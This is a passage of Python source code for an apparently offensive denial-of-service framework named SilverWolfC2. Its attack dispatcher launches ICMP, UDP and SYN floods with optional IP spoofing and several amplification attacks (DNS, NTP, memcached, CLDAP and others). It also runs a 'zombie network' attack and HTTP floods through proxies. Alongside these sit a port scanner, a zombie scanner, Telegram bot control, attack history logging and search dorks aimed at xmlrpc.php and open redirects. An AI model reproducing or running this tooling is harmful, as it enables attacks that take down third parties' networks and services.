    async def start_attack(self, target, port, bytes_per_sec, threads, duration, use_proxies, attack_type, save_attack, target_url, use_spoofing=False):
        print(f"{colorama.Fore.GREEN}[+] Starting SilverWolf attack...")
        self.attack_running = True
        self.attack_stats = {'packets_sent': 0, 'bytes_sent': 0, 'requests_sent': 0, 'start_time': time.time()}
        for key in self.attack_module_stats:
            self.attack_module_stats[key] = 0
        start_time = datetime.now()
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        attack_threads = []
        try:
            if attack_type in ["all", "icmp"]:
                t = threading.Thread(target=self.icmp_flood, args=(target, bytes_per_sec, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "udp"]:
                t = threading.Thread(target=self.udp_flood, args=(target, port, bytes_per_sec, duration, use_spoofing))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "syn"]:
                t = threading.Thread(target=self.syn_flood, args=(target, port, bytes_per_sec, duration, use_spoofing))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "dns_amp"]:
                t = threading.Thread(target=self.dns_amplification, args=(target, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "ntp_amp"]:
                t = threading.Thread(target=self.ntp_amplification, args=(target, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "snmp_amp"]:
                t = threading.Thread(target=self.snmp_amplification, args=(target, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "ssdp_amp"]:
                t = threading.Thread(target=self.ssdp_amplification, args=(target, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "memcached_amp"]:
                t = threading.Thread(target=self.memcached_amplification, args=(target, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "cldap_amp"]:
                t = threading.Thread(target=self.cldap_amplification, args=(target, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "chargen_amp"]:
                t = threading.Thread(target=self.chargen_amplification, args=(target, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type == "zombie":
                t = threading.Thread(target=self.zombie_network_attack, args=(target_url, duration))
                t.daemon = True
                attack_threads.append(t)
                t.start()
            if attack_type in ["all", "http"]:
                async_task = asyncio.create_task(self.run_async_http_attacks(target, port, threads, use_proxies, duration))
                try:
                    if duration > 0:
                        await asyncio.wait_for(async_task, timeout=duration)
                    else:
                        await async_task
                except asyncio.TimeoutError:
                    print(f"{colorama.Fore.YELLOW}[!] Attack duration completed.")
            for t in attack_threads:
                t.join(timeout=1)
        except KeyboardInterrupt:
            self.attack_running = False
            print(f"\n{colorama.Fore.YELLOW}[!] Attack stopped by user.")
        except Exception as e:
            self.attack_running = False
            print(f"{colorama.Fore.RED}[!] Attack error: {e}")
        self.attack_running = False
        end_time = datetime.now()
        if save_attack:
            self.save_attack_data(target, port, start_time, end_time)
        self.print_attack_summary()

    def print_attack_summary(self):
        print(f"\n{colorama.Fore.CYAN}[+] Attack Summary:")
        print(f"{colorama.Fore.WHITE}Packets Sent: {self.attack_stats['packets_sent']:,}")
        print(f"Bytes Sent: {self.attack_stats['bytes_sent']:,}")
        print(f"Requests Sent: {self.attack_stats['requests_sent']:,}")
        print(f"\nModule Usage:")
        for module, count in self.attack_module_stats.items():
            if count > 0:
                print(f"  {module}: {count:,}")

    def print_stats(self):
        while self.attack_running:
            time.sleep(2)
            elapsed = time.time() - self.attack_stats['start_time']
            if elapsed > 0:
                packets_per_sec = self.attack_stats['packets_sent'] / elapsed
                bytes_per_sec = self.attack_stats['bytes_sent'] / elapsed
                requests_per_sec = self.attack_stats['requests_sent'] / elapsed
                sys.stdout.write(f"\r{colorama.Fore.CYAN}[STATS] {datetime.now().strftime('%H:%M:%S')} | "
                      f"Time: {int(elapsed)}s | "
                      f"Packets: {self.attack_stats['packets_sent']:,} ({packets_per_sec:.0f}/s) | "
                      f"Bytes: {self.attack_stats['bytes_sent']:,} ({bytes_per_sec:.0f}/s) | "
                      f"Requests: {self.attack_stats['requests_sent']:,} ({requests_per_sec:.0f}/s)")
                sys.stdout.flush()

    def save_attack_data(self, target, port, start_time, end_time):
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('''
                INSERT INTO attacks (target, port, start_time, end_time, packets_sent, bytes_sent, requests_sent, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                target, port, start_time, end_time,
                self.attack_stats['packets_sent'],
                self.attack_stats['bytes_sent'],
                self.attack_stats['requests_sent'],
                'completed'
            ))
            self.db_conn.commit()
            if hasattr(self, 'logger'):
                self.logger.info(f"Attack data saved for {target}:{port}")
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Error saving attack data: {e}")

    def view_attack_history(self):
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('SELECT * FROM attacks ORDER BY start_time DESC LIMIT 20')
            attacks = cursor.fetchall()
            if not attacks:
                print(f"{colorama.Fore.YELLOW}[!] No attack history found")
                return
            print(f"{colorama.Fore.CYAN}[+] Recent Attack History:")
            print(f"{'ID':<5} {'Target':<20} {'Port':<6} {'Start Time':<20} {'Duration':<10} {'Packets':<12} {'Bytes':<12} {'Requests':<12}")
            print("-" * 100)
            for attack in attacks:
                attack_id, target, port, start_time, end_time, packets, bytes_sent, requests, status = attack
                try:
                    duration_td = datetime.fromisoformat(end_time) - datetime.fromisoformat(start_time)
                    duration_str = str(duration_td).split('.')[0]
                except:
                    duration_str = "N/A"
                print(f"{attack_id:<5} {target:<20} {port:<6} {start_time[:19]:<20} {duration_str:<10} {packets:<12,} {bytes_sent:<12,} {requests:<12,}")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Error viewing attack history: {e}")

    def proxy_database_manager(self):
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM proxies WHERE status = "Working"')
            working_count = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM proxies')
            total_count = cursor.fetchone()[0]
            print(f"{colorama.Fore.CYAN}[+] Proxy Database Statistics:")
            print(f"  Total proxies: {total_count}")
            print(f"  Working proxies: {working_count}")
            print(f"  Success rate: {(working_count/total_count*100):.2f}%" if total_count > 0 else "  Success rate: 0%")
            if total_count > 0:
                choice = input(f"\n{colorama.Fore.WHITE}Export working proxies? (Y/N): ").lower()
                if choice == 'y':
                    cursor.execute('SELECT proxy FROM proxies WHERE status = "Working"')
                    working_proxies = cursor.fetchall()
                    if working_proxies:
                        filename = f"working_proxies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                        with open(filename, 'w') as f:
                            for proxy in working_proxies:
                                f.write(proxy[0] + '\n')
                        print(f"{colorama.Fore.GREEN}[+] Working proxies exported to {filename}")
                    else:
                        print(f"{colorama.Fore.YELLOW}[!] No working proxies to export")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Error managing proxy database: {e}")

    def system_information(self):
        print(f"{colorama.Fore.CYAN}[+] System Information:")
        print(f"  OS: {platform.system()} {platform.release()}")
        print(f"  Python Version: {platform.python_version()}")
        print(f"  Architecture: {platform.machine()}")
        print(f"  Processor: {platform.processor()}")
        print(f"  Loaded Proxies: {len(self.proxies)}")
        print(f"  Loaded User Agents: {len(self.user_agents)}")
        print(f"  Loaded Dorks: {len(self.dorks)}")
        try:
            import psutil
            memory = psutil.virtual_memory()
            print(f"  Memory: {memory.available / (1024**3):.2f}GB available / {memory.total / (1024**3):.2f}GB total")
            print(f"  CPU Cores: {psutil.cpu_count()}")
            print(f"  CPU Usage: {psutil.cpu_percent()}%")
        except ImportError:
            print(f"  Memory/CPU info: psutil not installed")

    def show_menu(self):
        self.clear_screen()
        self.print_logo()
        print(f"{colorama.Fore.CYAN}=== MAIN MENU ===")
        print(f"{colorama.Fore.WHITE}[1] Start Attack")
        print(f"[2] Proxy Checker")
        print(f"[3] IP Lookup")
        print(f"[4] DNS Resolver")
        print(f"[5] Port Scanner")
        print(f"[6] TCP Ping (PaPing)")
        print(f"[7] View Attack History")
        print(f"[8] Proxy Database Manager")
        print(f"[9] System Information")
        print(f"[10] Zombie Scanner")
        print(f"[11] Exit")
        print(f"{colorama.Fore.CYAN}=================")

    def run(self):
        if self.telegram_bot:
            def run_telegram():
                self.telegram_bot.polling(none_stop=True)
            telegram_thread = threading.Thread(target=run_telegram, daemon=True)
            telegram_thread.start()
        while True:
            try:
                self.show_menu()
                choice = input(f"{colorama.Fore.GREEN}Select option: ").strip()
                if choice == "1":
                    attack_params = self.get_attack_options()
                    if attack_params:
                        target, port, bytes_per_sec, threads, duration, use_proxies, attack_type, save_attack, target_url, use_spoofing = attack_params
                        self.clear_screen()
                        self.print_logo()
                        self.print_attack_status(target, port, bytes_per_sec, threads, duration, use_proxies, attack_type, save_attack)
                        try:
                            resolved_ip = socket.gethostbyname(target)
                            print(f"{colorama.Fore.GREEN}[✓] Resolved target IP: {resolved_ip}")
                            target = resolved_ip
                        except Exception as e:
                            print(f"{colorama.Fore.YELLOW}[!] Could not resolve target domain: {e}")
                        asyncio.run(self.start_attack(target, port, bytes_per_sec, threads, duration, use_proxies, attack_type, save_attack, target_url, use_spoofing))
                        input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "2":
                    self.proxy_checker()
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "3":
                    target = input(f"{colorama.Fore.WHITE}Enter IP/Domain: ")
                    self.ip_lookup(target)
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "4":
                    target = input(f"{colorama.Fore.WHITE}Enter domain: ")
                    self.dns_resolver(target)
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "5":
                    target = input(f"{colorama.Fore.WHITE}Enter IP/Domain: ")
                    port_range = input(f"{colorama.Fore.WHITE}Port range (e.g., 1-1000): ") or "1-1000"
                    self.port_scan(target, port_range)
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "6":
                    target = input(f"{colorama.Fore.WHITE}Enter IP/Domain: ")
                    try:
                        port = int(input(f"{colorama.Fore.WHITE}Enter port: "))
                    except ValueError:
                        port = 80
                    try:
                        count = int(input(f"{colorama.Fore.WHITE}Number of pings: ") or "4")
                    except ValueError:
                        count = 4
                    self.paping(target, port, count)
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "7":
                    self.view_attack_history()
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "8":
                    self.proxy_database_manager()
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "9":
                    self.system_information()
                    input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")
                elif choice == "10":
                    self.zombie_scanner_menu()
                elif choice == "11":
                    print(f"{colorama.Fore.YELLOW}[!] Exiting SilverWolf...")
                    if hasattr(self, 'logger'):
                        self.logger.info("SilverWolf shutting down")
                    try:
                        self.db_conn.close()
                    except:
                        pass
                    break
                else:
                    print(f"{colorama.Fore.RED}[!] Invalid option")
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{colorama.Fore.YELLOW}[!] Exiting SilverWolf...")
                if hasattr(self, 'logger'):
                    self.logger.info("SilverWolf interrupted by user")
                try:
                    self.db_conn.close()
                except:
                    pass
                break
            except Exception as e:
                print(f"{colorama.Fore.RED}[!] Error: {e}")
                if hasattr(self, 'logger'):
                    self.logger.error(f"Main loop error: {e}")
                input(f"\n{colorama.Fore.GREEN}Press Enter to continue...")

    # --- Tools ---
    def check_proxy(self, proxy):
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) != 2:
                return False, proxy, "Invalid format", 0
            proxy_ip, proxy_port = proxy_parts
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((proxy_ip, int(proxy_port)))
            end_time = time.time()
            response_time = (end_time - start_time) * 1000
            sock.close()
            if result == 0:
                return True, proxy, "Working", response_time
            else:
                return False, proxy, "Connection failed", response_time
        except Exception as e:
            return False, proxy, str(e), 0

    def proxy_checker(self):
        if not self.proxies:
            print(f"{colorama.Fore.RED}[!] No proxies loaded from proxy.txt")
            return
        print(f"{colorama.Fore.CYAN}[+] Checking {len(self.proxies)} proxies...")
        working_proxies = []
        progress = ProgressBar(len(self.proxies), prefix='Checking:', suffix='Complete', length=30)
        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_proxy = {executor.submit(self.check_proxy, proxy): proxy for proxy in self.proxies}
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    is_working, proxy_addr, status, response_time = future.result()
                    if is_working:
                        working_proxies.append(proxy_addr)
                        print(f"{colorama.Fore.GREEN}[✓] {proxy_addr} - {status} ({response_time:.2f}ms)")
                    cursor = self.db_conn.cursor()
                    cursor.execute('''
                        INSERT OR REPLACE INTO proxies (proxy, status, last_checked, response_time)
                        VALUES (?, ?, ?, ?)
                    ''', (proxy_addr, status, datetime.now(), response_time))
                except Exception as e:
                    if hasattr(self, 'logger'):
                        self.logger.error(f"Proxy check error for {proxy}: {e}")
                progress.update()
        self.db_conn.commit()
        print(f"\n{colorama.Fore.GREEN}[+] Working proxies: {len(working_proxies)}/{len(self.proxies)}")
        if working_proxies:
            with open('working_proxies.txt', 'w') as f:
                for proxy in working_proxies:
                    f.write(proxy + '\n')
            print(f"{colorama.Fore.CYAN}[+] Working proxies saved to working_proxies.txt")
            if hasattr(self, 'logger'):
                self.logger.info(f"Proxy check complete: {len(working_proxies)}/{len(self.proxies)} working")

    def ip_lookup(self, target):
        try:
            print(f"{colorama.Fore.CYAN}[+] Performing comprehensive IP lookup for: {target}")
            try:
                ip = socket.gethostbyname(target)
                print(f"{colorama.Fore.GREEN}[✓] Resolved IP: {ip}")
            except:
                ip = target
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                print(f"{colorama.Fore.GREEN}[✓] Hostname: {hostname}")
            except:
                print(f"{colorama.Fore.YELLOW}[!] Could not resolve hostname")
            try:
                ip_obj = ipaddress.ip_address(ip)
                print(f"{colorama.Fore.CYAN}[+] Network Information:")
                print(f"  IP Version: IPv{ip_obj.version}")
                if ip_obj.is_private:
                    print(f"  Type: Private IP")
                else:
                    print(f"  Type: Public IP")
            except Exception as e:
                if hasattr(self, 'logger'):
                    self.logger.debug(f"IP address parsing error: {e}")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] IP Lookup error: {e}")
            if hasattr(self, 'logger'):
                self.logger.error(f"IP lookup error for {target}: {e}")

    def dns_resolver(self, target):
        try:
            print(f"{colorama.Fore.CYAN}[+] Resolving comprehensive DNS records for: {target}")
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
            for record_type in record_types:
                try:
                    result = dns.resolver.resolve(target, record_type)
                    print(f"{colorama.Fore.GREEN}[✓] {record_type} Records:")
                    for record in result:
                        print(f"    {record.to_text()}")
                except dns.resolver.NoAnswer:
                    print(f"{colorama.Fore.YELLOW}[!] No {record_type} records found")
                except Exception as e:
                    print(f"{colorama.Fore.YELLOW}[!] {record_type} lookup failed: {e}")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] DNS Resolver error: {e}")
            if hasattr(self, 'logger'):
                self.logger.error(f"DNS resolver error for {target}: {e}")

    def port_scan(self, target, port_range="1-1000"):
        try:
            print(f"{colorama.Fore.CYAN}[+] Performing comprehensive port scan for: {target}")
            try:
                ip = socket.gethostbyname(target)
            except:
                ip = target
            if '-' in port_range:
                start_port, end_port = map(int, port_range.split('-'))
            else:
                start_port = end_port = int(port_range)
            open_ports = []
            common_services = {
                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
                53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
                443: 'HTTPS', 993: 'IMAPS', 995: 'POP3S'
            }
            print(f"{colorama.Fore.CYAN}[+] Scanning ports {start_port}-{end_port}...")
            total_ports = end_port - start_port + 1
            progress = ProgressBar(total_ports, prefix='Scanning:', suffix='Complete', length=30)
            for port in range(start_port, end_port + 1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    service = common_services.get(port, 'Unknown')
                    open_ports.append((port, service))
                    print(f"{colorama.Fore.GREEN}[✓] Port {port} ({service}) is open")
                sock.close()
                progress.update()
            print(f"\n{colorama.Fore.GREEN}[+] Open ports found: {len(open_ports)}")
            if open_ports:
                print(f"{colorama.Fore.CYAN}Open ports: {', '.join([f'{p}({s})' for p, s in open_ports])}")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Port scan error: {e}")
            if hasattr(self, 'logger'):
                self.logger.error(f"Port scan error for {target}: {e}")

    def paping(self, target, port, count=4):
        try:
            print(f"{colorama.Fore.CYAN}[+] Performing TCP ping to {target}:{port}")
            times = []
            successful = 0
            for i in range(count):
                start_time = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                try:
                    sock.connect((target, port))
                    end_time = time.time()
                    response_time = (end_time - start_time) * 1000
                    times.append(response_time)
                    successful += 1
                    print(f"{colorama.Fore.GREEN}[✓] Ping {i+1}: {response_time:.2f}ms")
                except Exception as e:
                    print(f"{colorama.Fore.RED}[✗] Ping {i+1}: Failed ({e})")
                finally:
                    sock.close()
                time.sleep(0.5)
            if times:
                avg_time = sum(times) / len(times)
                min_time = min(times)
                max_time = max(times)
                packet_loss = ((count - successful) / count) * 100
                print(f"\n{colorama.Fore.CYAN}[+] TCP Ping Statistics:")
                print(f"  Packets: Sent={count}, Received={successful}, Lost={count-successful} ({packet_loss:.1f}% loss)")
                print(f"  Round-trip times: Min={min_time:.2f}ms, Max={max_time:.2f}ms, Average={avg_time:.2f}ms")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Paping error: {e}")
            if hasattr(self, 'logger'):
                self.logger.error(f"Paping error for {target}:{port}: {e}")

# --- Main ---
if __name__ == "__main__":
    required_files = {
        'useragents.txt': """Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1""",
        'proxy.txt': """# Add proxies in format: IP:PORT
# Example:
# 192.168.1.1:8080
# 10.0.0.1:3128
# 8.8.8.8:8080""",
        'dorks.txt': """redirect.php?url=
redir.php?goto=
inurl:/xmlrpc.php
inurl:/wp-content/"""
    }
    for filename, content in required_files.items():
        if not os.path.exists(filename):
            with open(filename, 'w') as f:
                f.write(content)
            print(f"{colorama.Fore.GREEN}[+] Created {filename}")
    framework = SilverWolfC2()
    framework.run()
